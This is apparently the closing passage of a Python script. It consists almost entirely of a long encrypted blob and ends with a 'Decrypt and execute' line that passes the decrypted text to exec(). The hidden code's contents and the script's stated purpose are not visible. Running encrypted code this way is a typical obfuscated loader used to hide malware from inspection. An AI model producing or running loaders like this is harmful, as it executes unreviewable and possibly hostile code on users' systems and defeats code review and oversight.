yYfSONeDdYKlTLMGXbshYOeFQBV8UB6bH6Di79ahmfJegd-pb8YxJgVZa9C-vzxuVJtSDHye1b4Qm_11vNRtdVwa3a73Y10d0g_tW1wO-4HSOv2MfAP0sgkzuiXnoL4gn62j4Zl-Q9P35HOF14BCRD3KcGsYoPEtveKJ4lU2_4vzDHLMkQZlurbuOiREZ95s6LwfGvziE3PT0hHIaF0D1VRLjXl-xyC9f5_i9BaBZ3hpjHWE-vDiC9XhoCkLiz2Pp9M1g1yYfd13eiVtLuqn7vQ9OSYn_o_DfUw1pcxICGsMxSoE_5KZ0Ope3rHq8mjy51DGkhXx0HhSVagQxpYUzHc0g_r8GTdWmtLUepL4bcKhdzB3YprTAt3Cf-xMdRhhuEjrDqp-3qfjj9F9F4C5iKjFjXFtStDhOfWepgl6X3w1b6WBZdqn1VP5Nj134pw0pGAJSWLc8zrQs4r6SuiSAzyMdO89nRk7Nj1DrveIY96ul-cLTpmOHTTslFks-S6OvrjFpDI1vXnbMjunphpZOFfvIe5XktTIrn90gmkGNLTgeScafcoO40trhXHAdalpsBft8tiokPx9QOmkrca9tQwB1UT69T0vRo8VMI_9yhuJvJuoGTosfX0MiTIqMB84XZf90KfilKwm8GFTqx3Z5kYGl9faI8S1vF1NVPj_7lRBxy6ow4ur0nHnLHmq_UxEadqfaQl4loL88LQMmgd0DuLg6s8rJ_SEbdN95BlFTTDbFUbVGBWg5IIXYG7nAdZvop0wpTeoQ3Tm3oLDgz00FSaObaPR3HPW0GfdFdeakmVAr0uwP6VpXypxDB-L-rH1pSo42hpB8a3w4HDjLpPzqOefbKhBWUPFe4Q39jp97ql9ykDGG64ECnLWSwG5gjbFTjPDF2AzlISgv47E46WlBBmkRaEEpux7DJFHmmzTkiSRHgtC6X87yniK_zx_vOrKp00snOt1dApt3K0b8FD-PJ73O-Lamr0EJYBGQAeE84004uhiel96oNZf0Tc7kXXJhdMHx-wg-dQIK0FodTrmOhs0lGDzW7FkRUyauBeshH9JQXarrDwzGHV2H7hYRy5hPp_-NylQK9dVP5-kvEFPk47dk9aKOwd1Oiro9N66CkBPqjmhvMeF3Ys0x6e0S8yvbpoAw9TY_DMjO_hvpPANw8CCmlEd1p0qZAtbZoxNz3YmCHrMtIOPbYe7iF5otCZdbXi7jtRu45oA-umVPpNOpoo7eP81ziCzfAnCPEO5aMsMifkJDfXOQKjpboaV4F6hJGaAY8txmdVIWdxeE7yHM0q_z-fQcTJQElO23ZAYhyqROaqc0y_1XEGpmtnazvCuA4ic3lN6UahCXg8YnvBe_1Rc0aiJZCAUsics66SvvYqi8RhxfYYmU_6Bnu9dBW6fTwsUXd5j_ioFpWvpIuY3ZA6U47lA4OgyLK5gkQDLpIauK0SvC1lm8oZ2VW3e--MHzpTy5JJ5N1tofunvbzpOkjQAvAbO5s-ufGI71tFQvqaorvO__lt22aOn24T6nGM3dJhndm3z-QZI0VhniK-yFuqfOBnFsmFkCIiMTI-XSblB2NJAvHhZVTq_l7yn3tRm9rVenkLj2P3sCJzV5L8WSjf4cbAR2JKaiUZxLGY1t5uX60_u1hZCU7zYaQg15bzDHF32mt0M0M0ua18HZmIpRpScYKK2YZhPyM1qLMOLDtIKybAB3hfJhs4n7atVgFZ0MByvC_L0Udn3O4fk-_fIprLsz_TooRMMOGge3M3Z1h7kZmMlK8qM3l__zlGaTVdZETrcKJ8XKDENTjrLd-Up0baohCtBc4-80GaH5mzi1tH3yJVDOvhNsYTYG-bq2inD7wJ9A1Y_KPtnnixLcuQ2xzo1zoHJyD-ijH_zWaj5C6Gc5fyfVh4OF_9Ag9tTJJMKST-Kfo0ogt65MGHHj5R5SMhIY811q8o8obAFmeyFrFvDjgv1jl6ZxclwwXZ_cSRNmo4c1KIblWjjZWniZicNLfHvy8IKFwXW6F-HmLWfovTIA9YLgruEc7YoF50AqmiqHVFIEmGdbGsVX8oPwF2A8IJsxTqBpOBSvRhGHlKwMhz6WPDI7MNO0PPF-XaZlwjpZ0jaulJchYFxvpMaasaYk2JZD9z-EhG8t2JOd1L3FqsWgfjEElVyxjxLadvqA2wsg_gEBuwmMX1yGHxbvLMKeRSAqUY_jEfHlQa2Gn_K_B4RnbCH1MUnY2igksqTEsWJ6YJIGRU2ABzjJPI1QdpU8KBu6aT1wc90wVGTd1wuXjUhsuswdd9EHDCZ0wj7TP_bkFpRWMyRD1joke5d-72ngz5s6gqVnlkhFlreelAk35QvjT8qwn3JU8sLUHLhHI6a1ZorouCLyyhiEG132X8wpEaIPgOvMl5kkf-J7BB2ST13aKdSnFVI2LgZzJLicuSv_-jEboa509iXL0pERGr8PHRD7kL6052-SHKG-rsYmbtWOCNFSGkbnpUu589it0kEs5GSb7hceTD9yyFxxopgAhbq9vfrsAWuaeMBOZUrkRqJd4isiWCOrxY7MOAF7x2LxzOMYWjWD1Y-9kl0eUaX8YbCdcBvklOfj8Bu9LO2u2pjNK1NyYEJhjUDSNetUc9aeyCIqclISQwvuY9tQ0RV9-me0msC71pfE1UsGcT10-ZT8CTjwegZc4f8vuYXei287QgNjtnD70LYuMvze3z288uBy-3CkGYrl34NF2QdSZLblhghY7wZ34WiUA1WZOegoZ1_OiT3uPH8wFvrTdWQe2jr5yxV_kc3G2_eu1j7sypBfZw8wHxwMFPaNZjFlagZUq2PdpIHMQbVNgmDV4mcHavXq0bMh7fw-ncfBvFpqLbRvFcwMadxmcC9IocghffRNeNJ-N9GL3yuA7SgzyjXXOeTuHzt912XY3vPwlRXeBxvre0Wi4yf7n2Enpwrspj3VYbVPsKAAoidoiMbGm2ksSVACf5m8Yq60GOlHONyPxR8cwXA_bmZcJ5QQZmKTFj95zzNVc0puptrChIT1V9tWQgJXOhBWSLPsDWKHdMih4ve7Tpln4QoQBxOdwjdgxkTe6KJaGz4PQ_NXCyRXd6g8ElJfwUOccGuwkAeDwQ3iIOhuNRkrokxcdacfyHRU8grMh1s6tQGVyJ8zU-Pl8lIVggir0A-d_0zzO9-CBgp0ok47qIQ_mfoF6NJYH40GoFDkbrVmf_yHMcgWqqMZYhFUumyBXD8Hh1mO-a1pdMHxS2fyFmiZAUWxGUGpMqC5mvHAhLDDErMCvsLdTnLL_xiG4xPQk28yw1rfs-r_6Lo6e0Sr_2vlcwFuQpPJRS_udVyXlTAIe9taKTXW4uymALaScNuBP79XWyQW1yrddfxSFhTEQowvaIrTQ_j7PYsvSqQQ5fnMZU9_nNyg7HboE-8ePOR4aEm3nmOSzcmZY2kLfBsiwRyHcE2e3vE4OHQSbSSjmwaalygfX66XzE0ZrMecEBT9iVCljNKPWu9j3lI88YiiIIO4oirhuss-1MycRqO80YkYxp-BVnZsAIfZ1lSwMpdPTCYHDAdROl1xcXKAjbLWnAZ9XAuyHfI8ti0FD3zLrg1f4pLNO83IgpYxxJtc6dQLLiqiCGkyjsnmEIdK9NIO3Gm262S2MIjUiIS8_dZ3NZT_NcCQumoLfvQZSUQ8x4fO2PsT6jErcZypfXUbxsMtpbS35TJEMuFII540j7-ip92bdVu0C67qYL9KYLo_N4y7BISrDLs59RlETHCTfN3QyMqw2oJSPFHWhEhqQPd1CCQHwTe-kAlkGZURQccqjiL22RROzz6qel2Q16jWANElgi8DV7eiFfLJoRtCrAR7QKLLPwJ_6Vzso24orJ1nX1B_R51ffaEBjkHXmXZ8KAHk-ne1yVRBvvtp9EA9oa98PkHsUfsj6MDcqcdw_OotdObSAQXRlZueMZDDjjIHYtG-EJ3Db_xGe-6ki7jBePgujCQmoUISr9d_rPzxW002XYy5s_VgnNme8J5nXZege8JMVpufqPEMXs-s1zRqAPX0-SYoBMvfEW6EZZ52gc-XKGY-qTkpcZMahW02IoLeuPwrcOBV86r4iV6b2zxWiJpOSgQoZmEwDPg9x00wf1Kq01cglOaWBMhUSX-qCEuLdAbanvN3J6-o7CnuvHRiDaDcOKeyzs7vEmUqnvOsgdDnlX85Eb2s88JK7Fgxveoot1MeRWJ8seLYiMPbm5O_Xx22JzJs59Lo341jgPhAwJHira2_sV1sQy1-U_3T9TNpbo3dRs8jfQ_d3Jwgw9BC4YK8XpXA03MiTpF8nCPGPLlgpsfPf3Hv2n5hvVykojIpcWkY-K-6qTaSJfh3cCIUkWj9RC1hrOzlpDS_TkwoP7UnUM2N4YIDMUvZUBenrNv8l2Zc_9GVUtE8T8t5I8CIi1BU2xb0qBblilC_2J_LbZqRJ8Hfm41Np8GAQ6CTnhJo4CK9t_TNZOI8b5Px4JSAphky2lg5FPw3bZDZZjDYlM2dLje_8NB89zCeMQ8rxTv5gmP8RrxVYNR6EquUL2ofzZ7m9Ip9Mv_MZOjVvSnBWRZCmqSVBU3qcxLrGSLCpqfL5-gVnzbOzRFGE7d-LNNOkvz564Ydo_4YYE0an3Zbuu8Gw4tijEsZMB_dFwshhRgVYiSr74DOW2VQd3c0WhRNUmFUzYEQMhXryB5bOZlP-WIa3L8Kyj1epgSR-DkayEpwJljG3NjXypPOVgFLUPBQV_GSzK19G6Hg5WHUG4NWpOewZbPnOThwNzYHfXXa-uPlInsHKsorTM62ODR739VzwcXjOlLID0hE0aWjskKZs9mOPRxgEnqJTJGiqEuso8p0ZfCiQaSspJFbkc-7RMWVD5tSLmmamB-J5POS6ukKuz5QPo7b76kyfmnhhHFahpe2VRFqDthzE9KArW6H3nUJ8WdkrknVJGgGalou_VuM4w46xJvqiSk6Wj8J14jOkgY1b2q3jYbwyHmirmzMG-jkm0gQAxjjbVbiaQ0G7c0gSaXW4rUI3vTDmUWReEsxfSQCUfbvMTY-v4Z8wloYUjVc7ejDmtTtpYekeDkrg29KtnuIdTn5S3evkurdp_Rk-rCN1lVsCjXDgeQVeAlMbn-1YbN2m202drmUeOQiTy3nIv5IBwk8SFiQpikBZzSst1bTOfS_NMfpPAbvrijiEqEQcHfmBkOODpF9sRUBIHLZOIxrSt90J-eXXUix2-kfEIrV1HQb9I15m_4MD2kECITwITLXBrbKrKgE7qThItb88GcPy8GgpvwmT9ppBNFcWwwbF-eLzZVuHb9BUyZariGZt0XmR_H0GQtfx2sYO5Bh5PMH95HWBvS_jqqAJxlo_2HSRK-ovRgljuFg10jWVnmYoqM1vz5apFEM9_bVPwQ-zM3qD5iuc4pjYeTTJ6udo4ICQgtDPMOIpLQ-xsBhtsR9T-2VOldKoJ6uH862HjTDaOxMh4TpoPhuja3J8VivOAaYkfGITG20VHnvbQ1vZUwEOrKz7Gyz_u1dO06qLm29MNB82ZEKjKXjIxGTFOZU3Bk-hWIW4-5-A_CHUFnHh-2Oeobti7i2BfHjn0GMybn6bdR61P1BrccyTcMALY1hOQ23Oq1KyPD-GzU9ISzUmKNpsn636DyNx8EbSs4WOam0wCXF7PbF9qMn8IW7fBR_8AAdxsQvInfGwNGDAqcynf6EMJfs3SbV-X_Yvrx2RjLj00TFZ1TfhSM_ZaFciwEdvNw2G3rRsqMWpgXj40dg2T23IReRzYdOcvqbRqlXsHW3RMabhXkecCPcC0EuX4_-0-AaYMfhN4IpwkjRdrAo2yNaFNItQK91fSHHvnyICI9alnJhxXfsc6WYQyZ6vJHHGL4zcABJnDT6ixuz20yAiRTUcurPcTLXPIyfZX-sHRsFVFDqSmpwNQtBanUKvmpzUZ81oVQWBm8N0DY1AQzisKWhpunzj8kfghxuecmTxoymbDxmIA2cK4W6-wqxBDgNU5fyFbME6vfJiFZDp6cnTEx_2pZ2TCSO-HPd2OtsyLAU2MDRjkUAE4voTX0Hh-4RoyY-aCuRuNrVoDZFpJwht9cEU9dQxMm6O5J7o45V2VGegV1zWeXYvhwN7YSsTF5Qng2cbpG0ZlXWT3Umw9nl2ftMhi3H9OnkvISRWiq-ooTQGWi1GbIGhyuc3VF8-kqvhSbN9DX4sy004xYfXEHpGRSFWJGSr73ZyEd9NvydyPi6DjohCGZy7SCtkF4ok4fjI8BhRHSYvWGs5oV4Rlc16KxwzodR7JP_05Da9AIDmKO8ANWFvaEfIEzmCwLDBvRb7KzSav0PcE72ZGdZX5I0gDXKQk8JOm3TsLhZ04ka-n4X9i4JcbZDMqt91hPqwOepPE_qgVqFC5rcFDBPhC3Djyt_GQNB98ZgEDXiPGhiiZqKf_sviI4RvP4hyjesgxftPXj1xuWyTWDmFVF4AI6z0AkgSS1J_VgpoqpjbQ7GfvePk3Ca5z2DmkKRq1-d_vy1U3Ov7W2nMBiTAs3fio3qxxdGEGrlfLDAl09oPNWEMBR3ihpqpq-ljpDT_JgqsYYYlUOy5Ho3syvlf08Wzsm4FD4wj-k-r_L6Hrwki6AdBIimCZiXU7gtqk1iZY8y53fBayAmkLo1KtItvJ4_rtbTnCtPY32G2SShOlLd7g_CJLtCaUolJN2kF48T_j86HLkOEWCdkG77Gn8vZRZnUMXm-mZs384WiOFKwki5z7t7_tiuU0cnxl8y54CRIhcnjTRNVF6QxY2sttvJqI4RFqEayqocJL8vvhvi9gsoWHad2zniroZ3CEeVE78t-yPIiYZmvQOETgzoQtwlaUuL5T6dToBZWOFEJRILray4jVWNFTarwbTa1smQe9iK9HebgGo1EqKZe1J8f2tLMMMyZpMQZ_65ej0QMoLPZsoO8D9ClanMzUK2orzyrQqjqciE535o2zyBOGDhPVhihqW9ycr6Wf-_8juaoicOwKNWpzc9dcOr674CTtSxTDq2wUQ307JxMdytKwGGMFFv3X2AT42eQiB1A1tpy5gcZC7B01zM3C5v8nMbvypbUbNcSVls58B5jBAMsvKUtA6TGoAK3UsVwzp0LomR1PymG0qsAxybmjTp-nOdSh1Bc8ZFBN6Li8eBKe-SABorLYxM7vfv_jB8hMVFKjS5tHr12yrbwo6vGB7VN7FscBEmjhhyix2FSHuxWzPexnKt422IoR8lU-Gb8sxanOSsTZliwuYBpS5A7sWzULKYeUkZPmuFcJyZU5Z-H6TB-J85EIABCZ0_HiMLJLQOQUZVbZ06nMZpVXQSSZFySCnxVciXLzSwHvD7evehUXwjkTjpv5JAUBDSLL7v70d_bcl4F3xJZDiSCdMT4YzorKVZRKjZfDLPaforC5obi-BG-uEbooWK0oCJmhEu54ByRnF2v5znWu49PlhCbgZ2cf6ZlZzrwEeI3U_AuDvnXSVJ0dcze8AeW27bllVbnVaWu2EIFPa42OlbsyxM1XZUFy_qRWAZJatp1iyX_T3auuvyOc7QeFjjzyzbWTXnXTirCKRuUkCzW3MsAEjicLL74vwGxHaHmgjrvoXqhMSCfiAq2t5y10J4LwU4HYP82D71TssUzqCAiTqDERLixAlmLYElCs4BLCWmRgUA53lcYE6EGyvrWCYgNKAOE2c3Fm9vUX-TPpRRQ1R6oqSWjftKaIavp-Gyv4zq2qYHTGtsfH2wod0LS0fSXqfRiBKHMFbY5ydN7k7TL5oS6zEv0Tm2XmSkeoBIKsWMQuRPCmjE7xETdJhf7vMbC_hbM9lQwIjCC7BV0qgWcP3WHJ1NrDZ9fInlVMkjSeJwMPpi0aXfP9LRsr0t-w1uCqPl7_vfAO3QKC6AZCX_D4KB-svSJDgET5eWg9owwkRSwKloTksGiYBF5pMVNuokWHzsZO35ZT6kir9f_32Q4BjP0wL1uKy-8FG7NM6fUL8BKctjELU9oeXxKTZdKnSmEvpogSJR-YRiRYGJzZP7A2-vlVeaeKIhlMi1gVNoNy0J88DnPyUhoER-hZ6tP-JOOlTeMwHxnj1mCOg4_ufRkeuO85RJspMYsxY4OFkLEIG-mv4JR8hToOdNoSPOlMe8KzJTzNLEnP6x-HbsD5Fj0oFooTDe2iPyH4tEv0iwwloo40KrHF4S66QkUx_DmrBwjKwsyYggv8Q4H6_u8ILMoAD2tUItziOlHHPtajAfSd4oZpAzSo7kNV70GrOdp1QlEuYix4UphPyQDBTc8FMocHc_0cxsLGHvPS_8rhFC6dAXxOLVLu08Ju8SDJtl7tnkzugcCBUFVxGN7ibH2YaJBASMqFOmFki6FSEA1OKNkU52NoyzjU-Y_eQWoKS7ICP4q0Ef2nMHGbQoOxqa3Me31GL_z4wXh_-5Xcjf23jYMqSsidulasGSytZMlKypdddFTlBbGywjmPwGhYHYeGxcya4pE1XnsODZ7KGXSwoWHW0I4okRBv-6fRpR71p6O23fSA1UBvF_eHZxpnx4XodiZeYzpG0jD15lPK6TH2vkxYH6mrGbZPzKYNPLow0urXn-9d0fPowPKqD6-_TCQwpaitCIvxWYcTs2WH8LQgqOAIZ-NsqDfYi4nPZa0ePcIhhVCAF0D3laiGpTsQlKHmFw5ZMgBuu4xPlTba5shw9oN63DnVIMoryzZA6vcgnDcSDUQ472hMjnJDMwzhuVF-EwlYiodfqZcP5meTBjdbIhKVpPp-d4gQQji68l5dr-W3B7VgQ58j7V1mxZNg0wVZF3rfXXnCLY449G1_FyIJ96Oxloq6XUC0l6TgBP4juGn7_bMO8OBc6KA3JhwLBhmabzwUjFLj8P1FcZdcXTz02eKMB5G8D9lBv2AWexyOTmQJWWpx-o96L1fjKEETNZDmyKvMF1-oEBLjgiBIXgMkrPcGUpfVDjeBCEw_0fb7Z0czkwNz_PyqlJxAe45tXyN1JBB2qgPpsN6-_4_gHuLzu8BmQdFI81yjnRurTMlc3vwTgOOsn34Key-_8EIdzbKlMXluonDBG1mtB91e8X4qNpGjDhv1UE_AcqI86bCs3M1gYeiY6bBpEqR9tFV3PXhHk3ArzxgrjI3DFSXKsWv3Tn2cJ_fRESv6JhjW3-GiN40MsoFQQ1-r7W4Q_Uj2Lb6jSglTapr3mTdG35lDt9zaJgPqdA7kWgpEUztj2Hp-HaYsejJZzZ18avuxLghDQK2XoaTFFjuVMpR1w76ilbDl9eR6gdTaNXbEPKIg4mVDahZsTfEKhffzex4C_E48YplbTI1B3PN57dA_5E3sdU3X24eXDgCR4qTMIM0gyGLBYVxRG3dMHTgogxLSWQNp5hjcADYi1R9N0pDC1GxaKTdcVofNxsHHnkhOZfHpijl82AtsPEzSDBwo8Sd_ShPSWsV79kk92EIUhbf_eMpTAJKaGrY_dX5HchDH0hY39rxtDKREqhiuDjqhAkLqJ8gnZWXociKFNCatx5HgMCrVDg5IAfDqCT270j2BtSqlx53t18s8ONWE-zdEpP9wl7_IT8tZR4t6f7MY012ojRsr5kkgcxrvlxiI6COOSlRbryc0gbOzJ41WlFefG4MRPQADXvyXcq51Vr6aaEHneCbNV8-SjJUx1rQpBNey8U6nqzBq7kKKI6b8jFdfMzV6sxeQAQNmHtOgkBKKKNcM8LaCjPkvcc3bExMV0xnoV57mmWe87dVrXC8NLSE9FktWLosAAgi171Gz90Sxbz4oSNGyvxTc-3Sul0pU22aom3zXuDcLTP4LRYIoL0L9OSAsg6YiJMq7lerSh28EMQlHcugx2mOFZTohPqZsp2tAWZGDFwkj2cAKl5Tg9v-b8NMAkGfYGFlmkYngfBXBEczQOubQ4lC4CQXTXWO1raOfw0xXCioEB9DHQg14SrSw8Mpyq8PEpyVFDtEy6XV-DlBK5V5dROy5MlO1CC9gPEHMKty-L5YRHZEwOsL325vn9cCP3D_kaDVPxLCKEOZAXbSR8OhwamwzX_eWKeIONTC2I1ccza21otuHvIbRExQt8cNHz0dhrwaJS-rjIgzfKA44rdqAsjzLwI5ccDSwqSo9kyiGLhOPGCpZT5OI0HG7erJ36gI8m_ClkvhJoyZ04jdU6Wtqovpue3vkybBSBcGmdsSBVMluCgCJlsYjr-SoAMGLnZIyv9DnrjffioMGYFMXDp1gd-sMBDjtrqp9z1OGB3pB5v74FZjTI1RLqCaBF9sZhwftDANZdD8Peb7lGYLJ9sMNHaHKFPKB4X25TCdPCOeSElYKlz3-bSlDGfV01zIPkAKa0uYwRtGekIEA9P32nLQ3hDgy6PMO_WN_rLzCot0pGBbdFj7MSoEW-GoOhfj2vZZz_R2tYwBvrHdeK8l3HVE0-KcOZIFsxJj9YMVIHreADSfzPet65SbF8NXIOrn1XHtJlScdnT-qjxsEy3iItkkBvNtULEEPk90DA8R8wRhR_eA6b4ln5k6hmBiKsBIstW7GgYYer_hBq_5AujSzg19a1y_AymK3j6kmmUoAit2VZYO9WBCzutFwAuYYk_-JndvTNwLfNtOcD-LC3HNWBh2z3TftbfGIijsfTRzVQ8d9TRR9R-oo8FI6Uv4KSRddpqcrom5BkqfqE-qnm9sOB1wo9CkyD8YvzwS8wgFd19ojBVeIwzZ9Ipxy2KnzYrQ7t_qni5wW4DDuT9MyXL0UqHt2T2wk4-Em_9_bs5z8RZaPLXtNFxa5VGObNZOFp0DTPtFyARrMlcjNz-b-bXLD7_wYgFZXb75SmvgXPCfZUhP9Y_K_CPSjmh5jlXUE1p8j8fL-zaIu1O323HK7egEcyV--fx_VO4xtxCXIBGXWsjpHayEi3JVAdq-T0r4DyJ4suU6WZ6ctooVwuz4rVqcu-xLyebIQ6giujYeaQ86FcPdTrHM6gCd6x_LiO4qe79ByMagFNqG2hYsWzqdqFrI4Lt8LjJL-KBMouiQzEozSuLGeLL4k4nuBYxQRBU4VBSryo8nGhCSkYiughBLidgQ5ocYgX_iQz8wH5x_VHD_w6xhCsujJcNWFvZsrc33X1yhTe8L_sCvwiyAUG1_z3HawDnPZL0qeIKzayT9hqYSdmOJ_YoRUl9n_1zRBrV6AZxX2xlOLAntCT0ZV-bH_iTAMGhVl57LgYbOofgvQZwaId_bU_YoZOI0Da5MRZRcw08F_teBhDmRoC8Ifqxj3G_Iyl3fMg9o4pDXhNIVwwFLLvKpwO8VYUbjbEY55l3c6v-4jbwmp-Zt9fCfPAXmzHA11x7gjMrnRiZwrSzXRMW9Z90c4rCBnrtsidYIEGNJ6ajEES-r0kx26tae-kn6z20zBpDBYE-28GhwnlvBG92R-a1SBRbzvJy2GiT4_4riW2jnZLBb0RsrKOwRosZU=")

# Decrypt and execute
exec(cipher.decrypt(encrypted_data).decode())
